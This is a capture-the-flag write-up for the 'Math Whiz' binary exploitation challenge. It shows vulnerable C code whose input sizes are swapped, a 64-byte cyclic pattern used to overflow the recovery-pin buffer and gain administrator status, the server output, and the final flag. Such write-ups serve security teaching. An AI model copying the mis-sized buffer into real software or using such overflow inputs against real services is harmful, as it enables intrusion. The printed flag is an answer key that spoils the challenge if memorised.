# Math Whiz
Binary Exploitation - 20 points

## Challenge 

Written by evanyeyeye

The neighborhood math whiz won't stop bragging about the [registration form](08e375bf1ab130f59197b62783d6df8ef7406b3093f3eaee4ce6ccaae6cc5639_register) ([source](b205be62e0ea85709eae9e6b43a2041383a6bcde3ab6e956b3077d68ef04b8aa_register.c)) he coded. Show him who's boss!

`nc problem1.tjctf.org 8001`

## Solution

Looking at source code, notice that the `input()` takes in a float for the buffer size which is multiplied by 16.

	int input(char *str, float f) {

	    fgets(str, 16 * f, stdin);

	    if (strlen(str) <= 1) {
	        puts("No input detected. Registration failed.");
	        exit(0);
	    } else if (!strchr(str, 10)) {
	        while (fgetc(stdin) != 10);
	    } else {
	        str[strlen(str) - 1] = 0;
	    }
	}

Hence, given the arrays, we know `f` must be the following

    char fullname[16];    // f=1
    char username[16];    // f=1
    char password[16];    // f=1
    char recoverypin[4];  // f=0.25
    char email[16];       // f=1
    char address[16];     // f=1
    char bio[64];         // f=4

However, we notice that `f` for `recoverypin` and `bio` are reversed

    printf("Recovery Pin: ");
    input(recoverypin, 4);

    printf("Email: ");
    input(email, 1);

    printf("Address: ");
    input(address, 1);

    printf("Biography: ");
    input(bio, .25);

Solve it.

	# pwn cyclic 64
	aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaa
	
	# ./register 
	******************** Please Register Below ********************
	Full Name: a
	Username: a
	Password: a
	Recovery Pin: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaa
	Email: a
	Address: a
	Biography: a
	Successfully registered 'faaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaa' as an administrator account!
	Here is your flag: -----REDACTED-----
	Segmentation fault

And on the server

	$ nc problem1.tjctf.org 8001
	******************** Please Register Below ********************
	Full Name: a
	Username: a
	Password: a
	Recovery Pin: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaa
	Email: a
	a
	Address: a
	Biography: 
	Successfully registered 'faaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaa' as an administrator account!
	Here is your flag: tjctf{d4n63r0u5_buff3r_0v3rfl0w5}
	timeout: the monitored command dumped core

## Flag

	tjctf{d4n63r0u5_buff3r_0v3rfl0w5}
